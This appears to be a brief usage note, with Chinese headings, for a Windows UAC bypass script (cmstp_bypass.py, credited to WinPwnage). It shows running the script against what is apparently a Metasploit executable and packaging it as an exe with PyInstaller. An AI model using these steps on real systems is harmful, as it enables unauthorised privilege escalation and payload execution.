### python运行

```
python3 cmstp_bypass.py C:\msf.exe

```

### 编译为exe运行

```
copy cmstp_bypass.py uac
python -m venv c:\uac\env
cd c:\uac
.\env\Scripts\active
pip install pyinstaller
pyinstaller cmstp_bypass.py
```

### From
<https://github.com/rootm0s/WinPwnage>